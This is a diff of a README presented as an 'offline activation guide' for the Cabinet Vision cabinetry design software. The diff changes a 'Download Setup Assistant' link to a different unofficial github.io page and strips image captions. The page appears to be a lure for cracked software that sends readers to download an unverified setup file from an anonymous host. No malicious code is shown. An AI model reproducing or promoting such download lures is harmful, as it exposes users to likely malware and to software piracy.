@@ -1,6 +1,6 @@
 # Cabinet Vision — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://cabinet-vision-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/Cabinet)
 
 ## ⚙️ How to Use
 
@@ -25,13 +25,13 @@
 ## 🖼 Preview
 
 ![Cabinet Vision — 3D Design Interface](https://i.ytimg.com/vi/b70EMnnG9rk/maxresdefault.jpg)  
-*Comprehensive cabinet layout in the 3D design environment*
+
 
 ![Cutlist and Nesting Preview](https://i.ytimg.com/vi/kzO3AqOxjE0/maxresdefault.jpg)  
-*Automatic cutlist generation and nesting visualization*
+
 
 ![High-Quality Rendered Output](https://hexagon.com/-/media/project/one-web/master-site/thumbnails/production-software/a0w4z00000f9x6kear-hexagon-cabinet-vision-xrendering.jpg?h=334&iar=0&w=592&hash=FDFE5C1C7832155D0313F8958AAC50D8)  
-*Realistic rendering output of designed cabinetry*
+
 
 ---
 
